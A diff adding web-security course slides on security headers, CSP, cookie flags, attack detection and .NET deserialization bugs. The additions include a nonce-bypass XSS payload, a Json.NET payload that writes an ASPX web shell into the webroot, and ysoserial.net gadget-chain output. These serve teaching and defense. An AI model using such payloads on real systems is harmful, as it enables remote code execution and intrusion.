@@ -234,6 +234,8 @@ slides: http://dumpco.re/websec
 9. Sensitive Data Exposure
 10. Transport Layer Encryption
 11. Insufficient Attack Protection
+12. Security Misconfigurations
+13. Object Injection
 ---
 class: center, middle
 # XSS
@@ -583,6 +585,26 @@ document.writeln()
 element.innerHTML = "..."
 element.outerHTML = "..."
 ```
+---
+# Built-in Browser XSS filters
+
+- Most browsers have them
+- Are enabled by default in most browsers
+- Are not perfect
+- Do **not** rely on them to prevent XSS for you as bypasses are found
+
+
+- `X-XSS-Protection: 0`
+	- Disables XSS filter
+- `X-XSS-Protection: 1`
+	- Enable it, instructs browser to  sanitize page.
+- `X-XSS-Protection: 1; mode=block`
+	- Enable it, prevent page rendering.
+- `X-XSS-Protection: 1; report=<reporting-uri>`
+	- Chromium only! Sanitize and report. This uses the functionality of the CSP report-uri directive to send a report.
+
+
+Use `1; mode=block` to disable sanitization.
 ---
 class: middle, center
 # Exotic ideas
@@ -2029,7 +2051,28 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 
 
 **Sending the preload directive from your site can have PERMANENT CONSEQUENCES and prevent users from accessing your site and any of its subdomains if you find you need to switch back to HTTP.**
+---
+# Public Key Pinning
 
+```
+Public-Key-Pins: pin-sha256="d6qzRu9zOECb90Uez27xWltNsj0e1Md7GkYYkVoZWmM=";
+	pin-sha256="E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=";
+	report-uri="http://example.com/pkp-report";
+	max-age=10000;
+	includeSubDomains
+```
+
+- Instruct the browser that for the duration of `max-age` (seconds) only accept the fingerprints specified by `pin-sha256` (SPKI fingerprints).
+- Subdomains are included when `includeSubDomains` are specified.
+- Pin validation failures are reported to `report-uri` if specified.
+
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Public_Key_Pinning
+
+**Caution:** If you for some reason need to change your certificate, some users will not be able to access your site!
+
+
+
+(click [here](https://www.ietf.org/mail-archive/web/websec/current/msg02106.html) if you wonder why anything other than sha256 isn't supported)
 ---
 # Teach users what to look for
 <img class="c" src="teachtls.png" width="90%">
@@ -2046,7 +2089,7 @@ source: https://en.wikipedia.org/wiki/Transport_Layer_Security
 - Logjam (https://weakdh.org/logjam.html)
 ---
 ### Logjam demo
-<video class="c" style="box-shadow: 0 0 40px #ccc;" width="90%" controls="">
+<video class="c" style="box-shadow: 0 0 40px #ccc;" width="90%" controls autoplay>
 	<source src="eavesdrop-dhe-512.mp4" type="video/mp4">
 	Your browser does not support MP4 videos.
   </video>
@@ -2111,6 +2154,544 @@ class: middle, center
 ---
 class: middle, center
 # Insufficient Attack Protection
+---
+# Insufficient Attack Protection
+- Prevent
+- Detect
+- React
+---
+### Hacking (especially automatic tools) produce noise
+<img src="sqlmap.png" width="90%" class="c">
+---
+## Even "stupid" rules would detect some things
+
+- No more than 1 request every 5 seconds per IP-address
+- No URLs longer than 200 characters
+- URLs cannot include SQL keywords
+- URLs cannot include JavaScript keywords
+- URLs cannot include vbscript keywords
+- URLs cannot include "../"
+- etc
+---
+## More complex solutions
+
+- Web Application Firewall
+	- ModSecurity (https://modsecurity.org/)
+		- OWASP ModSecurity Core Ruleset (https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project)
+- Intrusion Detection/Prevention System (IDS/IPS)
+	- Suricata (https://suricata-ids.org/)
+	- Snort (https://www.snort.org/)
+- Artificial Intelligence
+	- Nameles - Invalid Traffic Detection (http://nameles.org/)
+---
+## Patch Management
+
+- Who checks open source libraries for security updates?
+- How often?
+- Which security updates are important?
+- What do you do when you are unsure/don't know?
+- What is the procedure for updating?
+- How fast do you need to update?
+- Which systems do you update first?
+---
+## Logs
+
+- Do you log?
+- Do you log enough?
+- Do you log too much?
+- How often are logs inspected?
+- Who inspects logs?
+- What do you look for?
+- What do you do when you find items of interest?
+	- What do you do when you are unsure?
+- How long do you keep logs?
+- Where do you keep them?
+	- remote backup - what happens then the connection is down?
+		- how long do you keep remote backups?
+---
+#### Monitoring
+<img src="kibana.png" width="120%" class="c" style="margin-left:-10%;">
+
+source: https://i1.wp.com/www.thistechnologylife.com/wp-content/uploads/2014/08/kibana.png
+---
+## Monitoring of security events
+
+Examples:
+
+- Web application functionalty events
+	- account creations
+	- user logins
+	- ...
+- New OS accounts
+- New files on disk
+- Amount of File changes
+- Amount of disk entropy changes
+- Amount of traffic per IP-address
+- Abnormal amount of Tor traffic
+- Abnormal amount of traffic from specific country
+- ...
+
+
+The application must provide metrics for effective security monitoring!
+
+`/ok` is not enough!
+
+
+---
+class: middle, center
+## If/when you suspect an intrusion
+---
+class: middle
+## If/when you suspect an intrusion
+
+1. Do ***not*** power off the infected systems - disconnect them from the network
+	- Vital information may reside in memory
+		- malware samples
+		- IP-addresses of interest
+		- encryption keys of ransomware
+
+2. Hire Incident Responders and Forensics specialists
+---
+class: center, middle
+# Security Misconfiguration
+---
+# Security Misconfiguration
+- Missing HTTP security headers
+- Missing cookie flags
+- Unnecessary features enabled (debug mode, etc)
+- Outdated components
+- Firewall running but without any rules
+- Default accounts with default credentials
+- Detailed error handling
+- Use of cryptography with weaker configuration than the strongest available
+
+Lack of hardened configuration ≈ security misconfiguration
+---
+# HTTP Security Headers
+- HTTP Strict Transport Security
+- Public Key Pinning Extension for HTTP (HPKP)
+- X-Frame-Options
+- X-XSS-Protection
+- X-Content-Type-Options
+- Content-Security-Policy
+- Referrer-Policy
+---
+# X-Frame-Options
+
+Method for the server to tell the browser whether or not the page can be displayed inside a frame (e.g. iFrame)
+
+The header was created to protect against clickjacking aka "UI redress attack".
+
+Options:
+- `X-Frame-Options: deny`
+- `X-Frame-Options: sameorigin`
+- `X-Frame-Options: allow-from: <domain>`
+---
+# Clickjacking
+
+Same goal as CSRF: Performing action on behalf of a victim user
+
+Principle: you think you click on something on http://attacker.com, but instead you click on something on http://example.com
+---
+class: middle
+<img src="clickjacking.jpeg" width="100%" class="ns c">
+
+source: http://seclab.stanford.edu/websec/framebusting/framebust.pdf
+---
+class: middle, center
+<iframe width="560" height="315" src="https://www.youtube.com/embed/3mk0RySeNsU" frameborder="0" allowfullscreen></iframe>
+
+https://youtu.be/3mk0RySeNsU
+---
+class: middle, center
+### Solution: `X-Frame-Options: deny`
+---
+## `X-Content-Type-Options: nosniff`
+
+Prevents browser MIME sniffing, forcing browsers to interpret response as the statend content-type.
+
+```http
+HTTP/1.1 200 OK
+Content-Length: 108
+Content-Type: text/plain;
+X-Content-Type-Options: nosniff
+
+<html>
+<body bgcolor=”#AA0000″>
+Hello, world!
+</body>
+</html>
+```
+
+Requirements for exploitation:
+- User controllable response
+- No `X-Content-Type-Options: nosniff` header
+- Victim running browser which performs MIME sniffing
+
+---
+class: middle, center
+# Content Security Policy (CSP)
+
+### Whitelist content sources
+---
+# CSP "content"
+
+- scripts
+- stylesheets
+- fonts
+- media
+- images
+- forms
+- ...
+
+Documentation: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
+---
+# XSS hardening with CSP - Script whitelisting
+
+Typical website has alot of scripts from many different sources:
+- Inline script (`<script> ... </script>`)
+- External scripts (`<script src="script.js"></script>`)
+- analytics
+- CDN content
+- minified scripts
+- third party tools
+- plugins
+---
+# XSS hardening with CSP - Script whitelisting
+
+What is blocked/allowed?
+
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html;
+Content-Security-Policy: script-src https://example.com/
+
+<html>
+	1: <script>alert(1);</script>
+	2: <script src="https://example.com/strawberries.js"></script>
+	3: <script src="http://example.com/blueberries.js"></script>
+	4: <script src="https://google.com/hello.js"></script>
+</html>
+```
+---
+# XSS hardening with CSP - Script whitelisting
+
+What is blocked/allowed?
+
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html;
+Content-Security-Policy: script-src https://example.com/
+
+<html>
+	1: <script>alert(1);</script>
+	2: <script src="https://example.com/strawberries.js"></script>
+	3: <script src="http://example.com/blueberries.js"></script>
+	4: <script src="https://google.com/hello.js"></script>
+</html>
+```
+
+1. Blocked
+2. Allowed
+3. Blocked
+4. Blocked
+---
+# XSS hardening with CSP - Script whitelisting
+
+```html
+<?php
+header("Content-Security-Policy: script-src 'nonce-YOLO'");
+?>
+
+<script>alert("hello!");</script>
+
+<script nonce="YOLO">alert("hello from nonce!");</script>
+```
+---
+# XSS hardening with CSP - Script whitelisting
+
+```html
+<?php
+header("Content-Security-Policy: script-src 'nonce-YOLO'");
+
+echo $_GET['injectable'];
+?>
+
+<script>alert("hello!");</script>
+
+<script nonce="YOLO">alert("hello from nonce!");</script>
+```
+
+---
+# XSS hardening with CSP - Script whitelisting
+
+```html
+<?php
+header("Content-Security-Policy: script-src 'nonce-YOLO'");
+
+echo $_GET['injectable'];
+?>
+
+<script>alert("hello!");</script>
+
+<script nonce="YOLO">alert("hello from nonce!");</script>
+```
+`/a.php?injectable=<script+nonce%3d"YOLO">alert("XSS")%3b</script>`
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Security-Policy: script-src 'nonce-YOLO'
+Content-Length: 311
+Connection: close
+
+<script nonce="YOLO">alert("XSS");</script>
+
+<script>alert("hello!");</script>
+
+<script nonce="YOLO"> alert("hello from nonce!"); </script>
+ 
+```
+---
+# XSS hardening with CSP - Script whitelisting
+```html
+<?php
+$nonce = bin2hex(openssl_random_pseudo_bytes(14));
+
+header("Content-Security-Policy: script-src 'nonce-" . $nonce . "'");
+
+echo $_GET['injectable'];
+?>
+
+<script>alert("hello!");</script>
+
+<script nonce="<?php echo $nonce; ?>">alert("hello from nonce!");</script>
+```
+```http
+HTTP/1.1 200 OK
+Content-Security-Policy: script-src 'nonce-18c292a625d1a8f0ec712bc7ef00'
+Content-Length: 311
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<script nonce="YOLO">alert("XSS");</script>
+
+<script>alert("hello from inline!");</script>
+
+<script nonce="18c292a625d1a8f0ec712bc7ef00">alert("hello from nonce!");</script>
+ 
+```
+---
+# XSS hardening with CSP - Script whitelisting
+```http
+HTTP/1.1 200 OK
+Content-Security-Policy: script-src 'sha256-GAF48QOoxRvu0gZAmQivUdJPyBacqz
+	nBAXwnkfpmQX4='
+Content-Length: 77
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<script>alert('XSS');</script>
+<script>alert('test');</script>
+```
+```bash
+$ echo -n "alert('XSS');" | openssl dgst -sha256 -binary | base64
+73QCtja8McFjq8v/4GJw0UTKxydR5NoYiy8QQlN2TMA=
+$ echo -n "alert('test');" | openssl dgst -sha256 -binary | base64
+GAF48QOoxRvu0gZAmQivUdJPyBacqznBAXwnkfpmQX4=
+```
+---
+# CSP directives
+Non-exhaustive list:
+- base-uri
+- block-all-mixed-content
+- child-src
+- connect-src
+- default-src
+- font-src
+- form-action
+- report-uri
+- require-sri-for
+- sandbox
+- script-src
+- style-src
+- upgrade-insecure-requests
+- worker-src
+- ...
+
+documentation: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/
+---
+# CSP directives
+
+- [block-all-mixed-content](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/block-all-mixed-content): prevents loading any assets using HTTP when the page is loaded using HTTPS
+
+- [upgrade-insecure-requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/upgrade-insecure-requests): instructs browsers to treat all of a site's insecure URLs (those served over HTTP) as though they have been replaced with secure URLs (those served over HTTPS)
+
+The `upgrade-insecure-requests` directive is evaluated before `block-all-mixed-content` and If the former is set, the latter is effectively a no-op. It is recommended to set one directive or the other – not both.
+---
+class: center, middle
+# Referrer-Policy
+---
+# Referrer-Policy
+The `Referrer-Policy` header controls the `Referer` header (which was misspelled in the spec)
+- `Referrer-Policy: no-referrer`
+- `Referrer-Policy: no-referrer-when-downgrade`
+- `Referrer-Policy: origin`
+- `Referrer-Policy: origin-when-cross-origin`
+- `Referrer-Policy: same-origin`
+- `Referrer-Policy: strict-origin`
+- `Referrer-Policy: strict-origin-when-cross-origin`
+- `Referrer-Policy: unsafe-url`
+
+Use `no-referrer` if you are not using the referrer. If you are, use `same-origin`.
+
+documentation: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+---
+# HTTP Security Headers Exercises
+
+1. Go to https://securityheaders.io/
+2. Browse some sites under "Hall of Fame"
+3. Look at their security headers and make sure that you understand what they do and how they work
+4. Scan your own sites
+---
+class: middle, center
+# HTTP Cookie flags
+---
+# HTTP Cookie flags
+
+```
+Set-Cookie: <name>=<value>[; <Max-Age>=<age>]
+[; expires=<date>][; domain=<domain_name>]
+[; path=<some_path>][; secure][; HttpOnly]
+
+```
+1. `secure` - prevents the browser from sending the cookie without HTTPS
+
+2. `HttpOnly` - cookie cannot be accessed at all by any client side scripts
+---
+class: middle, center
+# Object injection / deserialization bugs
+---
+# Object injection / deserialization bugs
+https://github.com/JamesNK/Newtonsoft.Json
+```csharp
+public class Account
+{
+    public string Email { get; set; }
+    public bool Active { get; set; }
+    public DateTime CreatedDate { get; set; }
+    public IList<string> Roles { get; set; }
+}
+```
+```csharp
+string json = @"{
+  'Email': 'james@example.com',
+  'Active': true,
+  'CreatedDate': '2013-01-20T00:00:00Z',
+  'Roles': [
+    'User',
+    'Admin'
+  ]
+}";
+
+Account account = JsonConvert.DeserializeObject<Account>(json);
+Console.WriteLine(account.Email);
+// james@example.com
+```
+source: https://www.newtonsoft.com/json/help/html/DeserializeObject.htm
+---
+# Object injection / deserialization bugs
+```csharp
+public class Account
+{
+    public string Email { get; set; }
+	public string emailBackupFile { get; set; }
+
+	~Account()
+	{
+		using (System.IO.StreamWriter file = 
+            new System.IO.StreamWriter(emailBackupFile, true))
+        {
+            file.WriteLine(Email);
+        }
+	}
+}
+```
+```csharp
+string json = @"{
+  'Email': 'james@example.com',
+  'emailBackupFile': 'emails.txt'
+}";
+
+Account account = JsonConvert.DeserializeObject<Account>(json);
+```
+---
+<img src="finalizers.png" class="c ns" width="100%">
+###### source: https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/destructors
+---
+# Object injection / deserialization bugs
+```csharp
+public class Account
+{
+    public string Email { get; set; }
+	public string emailBackupFile { get; set; }
+
+	~Account()
+	{
+		using (System.IO.StreamWriter file = 
+            new System.IO.StreamWriter(emailBackupFile, true))
+        {
+            file.WriteLine(Email);
+        }
+	}
+}
+```
+```csharp
+string json = @"{
+  'Email': '<%\r\nSystem.Diagnostics.Process.Start(new System.Diagnostics
+	.ProcessStartInfo(\"cmd\", Request[\"x\"]));\r\n%>',
+  'emailBackupFile': 'c:\inetpub\wwwroot\shell.aspx'
+}";
+
+Account account = JsonConvert.DeserializeObject<Account>(json);
+```
+---
+# Tools
+
+
+```
+Usage: ysoserial.exe [options]
+Options:
+  -o, --output=VALUE         the output format (raw|base64).
+  -g, --gadget=VALUE         the gadget chain.
+  -f, --formatter=VALUE      the formatter.
+  -c, --command=VALUE        the command to be executed.
+  -t, --test                 whether to run payload locally. Default: false
+  -h, --help                 show this message and exit
+
+$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
+{
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName':'Start',
+    'MethodParameters':{
+        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$values':['cmd','/ccalc']
+    },
+    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+}
+
+$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
+AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAACJFQ0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgJmd0Ow0KICAgICAmbHQ7T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnMmZ3Q7DQogICAgICAgICZsdDtTeXN0ZW06U3RyaW5nJmd0O2NtZCZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7L2MgImNhbGMiICZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgJmx0Oy9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlciZndDsNCiZsdDsvUmVzb3VyY2VEaWN0aW9uYXJ5Jmd0Ow0KCQkJPC9TPiYjeEQ7DQogICAgICAgICAgPC9MU1Q+JiN4RDsNCiAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgIDwvUHJvcHM+JiN4RDsNCiAgICAgIDxNUz4mI3hEOw0KICAgICAgICA8T2JqIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIj4gJiN4RDsNCiAgICAgICAgICA8VE4gUmVmSWQ9IjEiID4gJiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPE9iaiBSZWZJZD0iMyI+ICYjeEQ7DQogICAgICAgICAgICAgIDxNUz4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49IkNsYXNzTmFtZSI+UnVuc3BhY2VJbnZva2U1PC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTmFtZXNwYWNlIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uPC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPE5pbCBOPSJTZXJ2ZXJOYW1lIiAvPiYjeEQ7DQogICAgICAgICAgICAgICAgPEkzMiBOPSJIYXNoIj40NjA5MjkxOTI8L0kzMj4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49Ik1pWG1sIj4gJmx0O0NMQVNTIE5BTUU9IlJ1bnNwYWNlSW52b2tlNSIgJmd0OyZsdDtQUk9QRVJUWSBOQU1FPSJ0ZXN0MSIgVFlQRSA9InN0cmluZyIgJmd0OyZsdDsvUFJPUEVSVFkmZ3Q7Jmx0Oy9DTEFTUyZndDs8L1M+JiN4RDsNCiAgICAgICAgICAgICAgPC9NUz4mI3hEOw0KICAgICAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9NUz4mI3hEOw0KICAgIDwvT2JqPiYjeEQ7DQogICAgPE1TPiYjeEQ7DQogICAgICA8UmVmIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIiAvPiYjeEQ7DQogICAgPC9NUz4mI3hEOw0KICA8L09iaj4mI3hEOw0KPC9PYmpzPgs=
+
+```
+https://github.com/pwntester/ysoserial.net
+---
+# Object Injection References
+
+- presentation: https://twitter.com/pwntester/status/917152966368473093
+- whitepaper: https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
+- PHP object injection: https://www.owasp.org/index.php/PHP_Object_Injection
+- Java object injection: http://frohoff.github.io/owaspsd-deserialize-my-shorts/
+- Java object injection tool: https://github.com/frohoff/ysoserial
 ---
 # Homework
 1. Browse https://wordpress.org/plugins/ and find a wordpress plugin which seems to be new, unpopular, or of low quality
